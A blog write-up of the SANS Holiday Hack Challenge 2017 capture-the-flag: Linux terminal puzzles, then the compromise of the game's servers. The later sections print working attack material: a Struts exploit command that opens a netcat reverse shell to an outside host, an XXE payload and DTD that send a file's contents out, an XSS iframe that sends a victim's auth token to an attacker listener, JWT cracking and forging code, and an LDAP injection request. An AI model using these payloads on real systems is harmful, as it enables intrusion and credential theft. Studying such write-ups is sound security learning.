---
layout: post
title: SANS Holiday Hacking Challenge
date: 2018-1-5 0:0:0 +0800
categories: CTF
tags: pentesting hacking 
img: assets/images/sansholidayhack2017title.png 
---


* 
{:toc}

## Overview

I will cut the lovely story behind the hacking tasks short. The homebase of Santa Clause is threatened by Giant Snowballs. Someone or something is throwing these snowballs onto the peaceful christmastown and you have to find out what's going on. To get some hints you have to solve some terminal challenges. That are web emulated shells with a given task. For solving these tasks one of the busy christmals elves will give you hints for the main tasks.

## 1 Terminal Challenges

### Isit42 (Overwrite C-Functions with Preload) Wunorse Openslae

Opening the Terminal will welcome you with the description for the challenge:

```bash
Wunorse Openslae has a special challenge for you.
Run the given binary, make it return 42.
Use the partial source for hints, it is just a clue.
You will need to write your own code, but only a line or two.
total 88
-rwxr-xr-x 1 root root 84824 Dec 16 16:56 isit42
-rw-r--r-- 1 root root   654 Dec 16 16:56 isit42.c.un
```

There is a file given that includes the important parts of the binary:
```c
#include <stdio.h>
// DATA CORRUPTION ERROR
// MUCH OF THIS CODE HAS BEEN LOST
// FORTUNATELY, YOU DON'T NEED IT FOR THIS CHALLENGE
// MAKE THE isit42 BINARY RETURN 42
// YOU'LL NEED TO WRITE A SEPERATE C SOURCE TO WIN EVERY TIME
int getrand() {
    srand((unsigned int)time(NULL)); 
    printf("Calling rand() to select a random number.\n");
    // The prototype for rand is: int rand(void);
    return rand() % 4096; // returns a pseudo-random integer between 0 and 4096
}
int main() {
    sleep(3);
    int randnum = getrand();
    if (randnum == 42) {
        printf("Yay!\n");
    } else {
        printf("Boo!\n");
    }
    return randnum;
}
```
With the hint from [SANS Blog](https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win) it was obvious that I can use `LD_PRELOAD` to overwrite standard libc functions. overwrite_getrand.c :
```c
#include <stdio.h>
int rand() {
return 4138;
}
```

When compiling you have to use specific flags:
```bash
$ gcc overwrite_getrand.c -o overwrite_getrand -shared -fPIC
```
- shared will create a shared library
- fPIC is used to create position independent code
This will make sure it overwrites functions from other shared libraries.
When executing it will now output the right value.
```bash
LD_PRELOAD="$PWD/overwrite_getrand" ./isit42
```


### Kill santaslittlehelperd Sparkle Redberry

Sparkle will give you a very easy and hard task, too, when you are not looking into the right files.

```bash
My name is Sparkle Redberry, and I need your help.
My server is atwist, and I fear I may yelp.
Help me kill the troublesome process gone awry.
I will return the favor with a gift before nigh.
Kill the "santaslittlehelperd" process to complete this challenge.
```

```bash
elf@efae06a0bf5f:~$ ps -fax
  PID TTY      STAT   TIME COMMAND
    1 pts/0    Ss     0:00 /bin/bash /sbin/init
    8 pts/0    S      0:00 /usr/bin/santaslittlehelperd
   11 pts/0    S      0:00 /sbin/kworker
   18 pts/0    S      0:00  \_ /sbin/kworker
   12 pts/0    S      0:00 /bin/bash
  107 pts/0    R+     0:00  \_ ps -fax
```
After some damning about this task because of it simplicity I got the problem.
All popular commands to kill processes have aliases to prevent actually killing anything. That feels like monkeyshines for admins.
```bash
elf@efae06a0bf5f:~$ alias
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'
alias egrep='egrep --color=auto'
alias fgrep='fgrep --color=auto'
alias grep='grep --color=auto'
alias kill='true'
alias killall='true'
alias l='ls -CF'
alias la='ls -A'
alias ll='ls -alF'
alias ls='ls --color=auto'
alias pkill='true'
alias skill='true'
```

With this knowledge I used "top" and pressed k to kill the process. Afterwards you have to refresh the page to solve it silently.


### Execute elftalkd Bushy Evergreen

Bushy wants you to find a executable. When you are familiar with grep this is very easy.

```bash
My name is Bushy Evergreen, and I have a problem for you.
I think a server got owned, and I can only offer a clue.
We use the system for chat, to keep toy production running.
Can you help us recover from the server connection shunning?
Find and run the elftalkd binary to complete this challenge.
```
When using grep with recursive option on the system root you can find it easily.

```
elf@11cb77f0b8ea:~$ grep -rli elftalkd / 2>/dev/null | grep elftalk
/run/elftalk/bin/elftalkd
```

### Starting ARM Train binary Pepper Minstix


Seeing a nice ASCII train Pepper would like you to execute a given binary.
```bash
My name is Pepper Minstix, and I need your help with my plight.
I've crashed the Christmas toy train, for which I am quite contrite.
I should not have interfered, hacking it was foolish in hindsight.
If you can get it running again, I will reward you with a gift of delight.


total 444
-rwxr-xr-x 1 root root 454636 Dec  7 18:43 trainstartup
```
It's executable by anyone but it's the architecture that matters:

```bash
elf@bdaf2542fc01:~$ file trainstartup 
trainstartup: ELF 32-bit LSB  executable, ARM, EABI5 version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=005de4685e8563d10b3de3e0be7d6fdd7ed732eb, not stripped
```

My first thought is emulation and I guess thats the intended solution:
```bash
elf@bdaf2542fc01:~$ /usr/bin/qemu-arm trainstartup 
Starting up ...
```

### Execute File without Permissions Holly Evergreen

Hollys challenge will ask you to execute a file.
```
My name is Holly Evergreen, and I have a conundrum.
I broke the candy cane striper, and I'm near throwing a tantrum.
Assembly lines have stopped since the elves can't get their candy cane fix.
We hope you can start the striper once again, with your vast bag of tricks.
Run the CandyCaneStriper executable to complete this challenge.
```
The desired file isn't owned by your user:
```bash
elf@a986aaa7e476:~$ ls -la
total 68
drwxr-xr-x 1 elf  elf   4096 Dec 15 20:00 .
drwxr-xr-x 1 root root  4096 Dec  5 19:31 ..
-rw-r--r-- 1 elf  elf    220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 root root  3143 Dec 15 19:59 .bashrc
-rw-r--r-- 1 elf  elf    655 May 16  2017 .profile
-rw-r--r-- 1 root root 45224 Dec 15 19:59 CandyCaneStriper
```

As it is allowed to read the file and we can use encoding utilities like base64 we can simply copy the content into a new file and execute it.

```bash
elf@a986aaa7e476:~$ cat CandyCaneStriper | base64 > CandyCaneStriper_base64
elf@a986aaa7e476:~$ cat CandyCaneStriper_base64 | base64 -d > CandyCaneStriper_elf
elf@a986aaa7e476:~$ cp /bin/touch test_file
elf@a986aaa7e476:~$ cp CandyCaneStriper_elf test_file
```
### Extract Information Minty Candycane

Minty gives us a http server log and wants us to find the least popular one:
```bash
Minty Candycane here, I need your help straight away.
We're having an argument about browser popularity stray.
Use the supplied log file from our server in the North Pole.
Identifying the least-popular browser is your noteworthy goal.
```

Maybe there are more elegant ways to exclude information progressively but it was the easiest way at first glance:

```bash
cat access.log | grep -v -i facebook | grep -v -i mozilla | grep -v -i safari | grep -v -i zmeu | grep -v -i slack | grep -v -i sysscan | grep -v -i googlebot | grep -v -i twitter | grep -v -i wget | grep -v -i masscan | grep -v -i python 
```
After excluding a lot of browser entries I found the one, that occurs only a single time. I never heard of it:
Dillo


### Edit Shadow without Rights Shinny Upatree


Shinny wants you to edit the shadow file without the needed permissions:
```
My name is Shinny Upatree, and I've made a big mistake.
I fear it's worse than the time I served everyone bad hake.
I've deleted an important file, which suppressed my server access.
I can offer you a gift, if you can fix my ill-fated redress.
Restore /etc/shadow with the contents of /etc/shadow.bak, then run "inspect_da_box" to complete this challenge.
```
When inspecting the sudoers file it occurs that my user is allowed to run `find` with shadow group rights. As find allows many exec operations on top it's easy to cook a bash command:

```c
sudo -g shadow find /etc/ -type f -name shadow.bak -exec /bin/cp {} /etc/shadow \;
```

### Inspecting christmassongs.db Sugarplum Mary

Sugarplum would like you to do some SQL queries to find the most popular christmas song.

```bash
Sugarplum Mary is in a tizzy, we hope you can assist.
Christmas songs abound, with many likes in our midst.
The database is populated, ready for you to address.
Identify the song whose popularity is the best.
total 20684
-rw-r--r-- 1 root root 15982592 Nov 29 19:28 christmassongs.db
-rwxr-xr-x 1 root root  5197352 Dec  7 15:10 runtoanswer
```

Inspecting the database file and its tables it will reveal it's structure. You have to count the likes depending on a given songid:

```bash
elf@907587d5d549:~$ sqlite3 christmassongs.db 
SQLite version 3.11.0 2016-02-15 17:29:24
Enter ".help" for usage hints.
sqlite> .schema
CREATE TABLE songs(
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  title TEXT,
  artist TEXT,
  year TEXT,
  notes TEXT
);
CREATE TABLE likes(
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  like INTEGER,
  datetime INTEGER,
  songid INTEGER,
  FOREIGN KEY(songid) REFERENCES songs(id)
);
```

You can do this with the `HAVING` syntax. It gives you the possibility to count all columns for a given value `like==1` and `songid`:

```
sqlite> SELECT like,songid,COUNT(*) c FROM likes where like==1 GROUP BY songid HAVING c > 1700 limit 100;
1|90|1715
1|98|1706
1|134|1719
1|199|1702
1|245|1756
1|265|1720
1|392|8996
```
Querying this songid from the second table gives us the songs name:

```
select title,id from songs where id=392;
Stairway to Heaven|392
```

## 2 Apache Struts Server
Task: 2) Investigate the Letters to Santa application at ![Letter_2_Santa_Web_App](https://l2s.northpolechristmastown.com). What is the topic of The Great Book page available in the web root of the server? What is Alabaster Snowball's password?

Sparkle Redberry gives a lot of hints about this tasks. It's very important to get this because all the other servers are only accessible internally over this one.
We can summarize the hints from Sparkle:
- Sometimes development content won't be deleted in production state of websites
- Alabaster, the admin, uses Apache Struts
- Backdoors and webshells are good to access system remotely
- Example for simple PHP webshell and [Link]( https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985)
- Some silly developers leave hardcoded credentials behind
- Isn't vulnerable against CVE-2017-5638
- Special character issues of XML and how to avoid them for exploiting with [Link](https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code)

SiteScreenshot

Following the first hint I inspect the source code of the site:

```html
</body> 
    <!-- Development version -->
    <a href="http://dev.northpolechristmastown.com" style="display: none;">Access Development Version</a>
    <script>
```
Nmapping both servers reveals that it's the same machine with multiple webservers serving different subdomains.

```bash
$ nmap l2s.northpolechristmastown.com

Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-12 22:05 CET
Nmap scan report for l2s.northpolechristmastown.com (35.185.84.51)
Host is up (0.093s latency).
rDNS record for 35.185.84.51: 51.84.185.35.bc.googleusercontent.com
Not shown: 994 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
443/tcp  open   https
3389/tcp closed ms-wbt-server
5060/tcp closed sip
5061/tcp closed sip-tls

Nmap done: 1 IP address (1 host up) scanned in 8.86 seconds

$ nmap dev.northpolechristmastown.com

Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-12 22:06 CET
Nmap scan report for dev.northpolechristmastown.com (35.185.84.51)
Host is up (0.096s latency).
rDNS record for 35.185.84.51: 51.84.185.35.bc.googleusercontent.com
Not shown: 994 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
443/tcp  open   https
3389/tcp closed ms-wbt-server
5060/tcp closed sip
5061/tcp closed sip-tls
```

After some research following the hints I decided to use this [tool](https://github.com/mazen160/struts-pwn_CVE-2017-9805) after it's indicating that this server is vulnerable:
```bash
$ python struts-pwn.py --url https://dev.northpolechristmastown.com/orders/

[*] URL: https://dev.northpolechristmastown.com/orders/
[*] Status: Vulnerable!
[%] Done.
```
After some try and error uploading a webshell I ended up using a simple reverse shell with another but simliar tool.
```bash
python struts_xml.py -u https://dev.northpolechristmastown.com/orders/- -c "nc -e /bin/sh federland.dnshome.de 56123"
```
As this is simple reverse shell is very annoying I was able to upgrade it nearly to a real TTY using this [article](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) and this resulting commands:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
$ export PATH=/usr/sbin:/usr/bin:/sbin:/bin
```
This two commands will give you easy access to all installed utilities and the possibility of using special keys.

As mentioned in the hints, developers will leave credentials behind, you have to look out for developing files like source code or documentation. As Alabaster deploys a Apache Struts server it's possible he created some java files for a apache tomcat server. Searching the default directory for the tomcat files we can find it:

```bash
$ grep -rli password opt

$ cat opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class
            ...
	    final String username = "alabaster_snowball";
            final String password = "stream_unhappy_buy_loss";   
	    ...
```
## 3 Network Reconnaisance & SMB Server

Task: 3) The North Pole engineering team uses a Windows SMB server for sharing documentation and correspondence. Using your access to the Letters to Santa server, identify and enumerate the SMB file-sharing server. What is the file server share name?

Therefore my first move was to scan the whole subnet:

```bash
nmap 10.142.0.0/24 
Starting Nmap 7.40 ( https://nmap.org ) at 2017-12-17 14:38 UTC
Nmap scan report for hhc17-l2s-proxy.c.holidayhack2017.internal (10.142.0.2)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
2222/tcp open  EtherNetIP-1

Nmap scan report for hhc17-apache-struts1.c.holidayhack2017.internal (10.142.0.3)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap scan report for edb.northpolechristmastown.com (10.142.0.6)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
389/tcp  open  ldap
8080/tcp open  http-proxy

Nmap scan report for hhc17-emi.c.holidayhack2017.internal (10.142.0.8)
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server


Nmap scan report for hhc17-apache-struts2.c.holidayhack2017.internal (10.142.0.11)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  http-alt

Nmap scan report for eaas.northpolechristmastown.com (10.142.0.13)
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server


Nmap scan report for mail.northpolechristmastown.com (10.142.0.5)
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
143/tcp  open  imap
2525/tcp open  ms-v-worlds
3000/tcp open  ppp
```

The scan from the internal network reveals some machines but none with a open SMB port 445.
The elf Holly Evergreen provided some hints for this challenge:
- Use the `-PS` flag of nmap to do TCP Syn Scan on specific ports
- Alabaster Snowball uses one strong password and uses it for multiple services
- Use ssh portforwarding to work from your machine into the internal network
- Use `smbclient` to communicate with SMB fileshare from linux

Nmap uses the `-PS` flag by default but only for port 443. When the desired machine doesn't respond to ICMP probes in addition it won't be detectable without custom nmap flags.
Apply this hint to the subnet scan:

```bash
nmap -PS445 10.142.0.0/24

Nmap scan report for hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)
Host is up (0.00073s latency).
Not shown: 996 filtered ports
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
```



## Windows SMB Server

```
ssh -L 139:10.142.0.7:139 -L 445:10.142.0.7:445 -L 135:10.142.0.7:135 -L 3389:10.142.0.7:3389  alabaster_snowball@l2s.northpolechristmastown.com
```


```
smbmap -u alabaster_snowball -p stream_unhappy_buy_loss -d workgroup -H 127.0.0.1 -R
[+] Finding open SMB ports....
[+] User SMB session establishd on 127.0.0.1...
[+] IP: 127.0.0.1:445	Name: localhost                                         
	Disk                                                  	Permissions
	----                                                  	-----------
	ADMIN$                                            	NO ACCESS
	C$                                                	NO ACCESS
	FileStor                                          	READ ONLY
	.\
	dr--r--r--                0 Wed Dec  6 22:51:45 2017	.
	dr--r--r--                0 Wed Dec  6 22:51:45 2017	..
	-r--r--r--           255520 Sun Dec 17 08:33:12 2017	BOLO - Munchkin Mole Report.docx
	-r--r--r--          1275756 Mon Dec  4 21:04:34 2017	GreatBookPage3.pdf
	-r--r--r--           111852 Sun Dec 17 08:31:32 2017	MEMO - Calculator Access for Wunorse.docx
	-r--r--r--           133295 Wed Dec  6 22:47:47 2017	MEMO - Password Policy Reminder.docx
	-r--r--r--            10245 Wed Dec  6 23:28:21 2017	Naughty and Nice List.csv
	-r--r--r--            60344 Wed Dec  6 22:51:47 2017	Naughty and Nice List.docx

```


```
smbget -U alabaster_snowball smb://127.0.0.1/FileStor/GreatBookPage3.pdfPassword for [alabaster_snowball] connecting to //FileStor/127.0.0.1: 
Using workgroup WORKGROUP, user alabaster_snowball
smb://127.0.0.1/FileStor/GreatBookPage3.pdf                                                    
Downloaded 1,22MB in 13 seconds
```

## Mail Server with custom Cookie based encryption


```
ssh -L 143:10.142.0.5:143  -L  8080:10.142.0.5:80 -L 25:10.142.0.5:25 -L 2222:10.142.0.5:22 -L 2525:10.142.0.5:2525 -L 3000:10.142.0.5:3000  alabaster_snowball@l2s.northpolechristmastown.com
```


```
$ dirb http://127.0.0.1:8080

---- Scanning URL: http://127.0.0.1:8080/ ----
+ http://127.0.0.1:8080/index.html (CODE:200|SIZE:11321)                                      
+ http://127.0.0.1:8080/info.php (CODE:200|SIZE:90820)   

./dotdotpwn.pl -m http -h 127.0.0.1 -x 8080 -M GET
[*] HTTP Status: 400 | Testing Path: http://127.0.0.1:8080/..%00%u2216..%00%u2216..%00%u2216..%00%u2216etc%u2216issue
[*] HTTP Status: 400 | Testing Path: http://127.0.0.1:8080/..%00%u2216..%00%u2216..%00%u2216..%00%u2216..%00%u2216etc%u2216passwd
```

```
nmap -sV 127.0.0.1 -p 22,25,8080,143,2525,3000

Starting Nmap 7.60 ( https://nmap.org ) at 2017-12-20 18:54 CET
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000055s latency).

PORT     STATE  SERVICE VERSION
22/tcp   closed ssh
25/tcp   open   smtp    Postfix smtpd
143/tcp  open   imap    Dovecot imapd
2525/tcp open   smtp    Postfix smtpd
3000/tcp open   http    Node.js Express framework
8080/tcp open   http    nginx 1.10.3 (Ubuntu)
Service Info: Host:  mail.northpolechristmastown.com; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
EWA="{"name":"GUEST","plaintext":"","ciphertext":""}"

EWA={"name":"alabaster.snowball@northpolechristmastown.com","plaintext":"","ciphertext":"WmczgfAW8upVlZabYxzEXQ"}




## Online Resource Management with XML External Entity (XXE) Vulnerability


```
ssh -L 8080:10.142.0.13:80 -L 3389:10.142.0.7:3389  alabaster_snowball@l2s.northpolechristmastown.com
```


```
cat order.xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE demo [
    <!ELEMENT demo ANY >
    <!ENTITY % extentity SYSTEM "http://federland.dnshome.de:13337/evil.dtd">
    %extentity;
    %inception;
    %sendit;
    ]
<
```

```
cat evil.dtd 
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % stolendata SYSTEM "file:///c:/greatbook.txt">
<!ENTITY % inception "<!ENTITY &#x25; sendit SYSTEM 'http://federland.dnshome.de:13338/?%stolendata;'>">
```

```
nc -l 13338
GET /?http://eaas.northpolechristmastown.com/xMk7H1NypzAqYoKw/greatbook6.pdf HTTP/1.1
Host: federland.dnshome.de:13338
Connection: Keep-Alive
```


## Database with XSS Vulnerability, JavaScript Web Token (JWT) Vulnerability and LDAP Injection Vulnerability 


```
ssh -L 18080:10.142.0.6:80  -L 2222:10.142.0.6:22 -L 3890:10.142.0.6:389 -L 28080:10.142.0.6:8080  alabaster_snowball@l2s.northpolechristmastown.com
```

```
ldapsearch -h 127.0.0.1 -p 3890 -x -b "dc=northpolechristmastown,dc=com" > edb_ldap_dump.txt
```

```
cat edb_ldap_dump.txt | grep "mail:" | cut -d":" -f2 | cut -d"@" -f1 > usernames.txt
```

### XSS

```
hi plz restore password <IFRAME SRC=# onload="document.getElementsByClassName('ticketlogo tooltipped')[0].setAttribute('src','http://federland.dnshome.de:56123/'+localStorage.getItem('np-auth'))"></IFRAME>

nc -l -p 56123
GET /eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I HTTP/1.1
Referer: http://127.0.0.1/reset_request?ticket=W0M50-B1XAN-2L4ND-247NN
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
Accept: */*
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en-US,*
Host: federland.dnshome.de:56123

 echo eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I | base64 -d
{"alg":"HS256","typ":"JWT"}...
```

### JWT

```bash
pyjwt  ecode --no-verify eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I
Essphrase for key '/root/.ssh/id_rsa': 
nter passphrase for key '/root/.ssh/id_rsa': 
{"dept": "Engineering", "ou": "elf", "expires": "2017-08-16 12:00:47.248093+00:00", "uid": "alabaster.snowball"}
```

installing jwt-tool
installing jwt-cracker

```bash
jwt-cracker eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I "abcdefghijklmnopqrstuwxyz" 6

other characters

"abcdefghijklmnopqrstuvwxyz0123456789" 6

using jwt_tool with rockyou.txt
```

```bash
./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I
Secret is "3lv3s"
```

```python
import jwt
import datetime
import time

JWT = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I"
SECRET_KEY = "3lv3s"

decoded_payload = jwt.decode(jwt=JWT, key=SECRET_KEY)
print(decoded_payload)

decoded_payload["expires"] = str(datetime.datetime.utcnow() + datetime.timedelta(seconds=6000))
print(decoded_payload)

token = jwt.encode(payload=decoded_payload, key=SECRET_KEY)
print("Generated Token: {}".format(token.decode()))
```

```javascript
localStorage.setItem('np-auth','eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTEyLTMxIDIyOjQ2OjI1LjM0MDc2OCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.tA3S1ZW6s4Bx9cMvndny454pLYD3C22-JMDkVCERX8E')
```

```bash
curl 	'http://127.0.0.1:28080/search' 
	-H 'Cookie: SESSION=gt60T0q3W0P52h88k001' 
	-H 'Origin: http://127.0.0.1:28080' 
	-H 'Accept-Encoding: gzip, deflate, br' 
	-H 'Accept-Language: en-US,en;q=0.8' 
	-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.104 Safari/537.36' 
	-H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' 
	-H 'Accept: */*' -H 'Referer: http://127.0.0.1:28080/home.html' 
	-H 'X-Requested-With: XMLHttpRequest' 
	-H 'Connection: keep-alive' 
	-H 'np-auth: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTEyLTMxIDIyOjQ2OjI1LjM0MDc2OCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.tA3S1ZW6s4Bx9cMvndny454pLYD3C22-JMDkVCERX8E' 
	--data 'name=))(department%3Dit)(%7C(cn%3D&isElf=False&attributes=profilePath%2Cgn%2Csn%2Cmail%2CuserPassword' --compressed
```



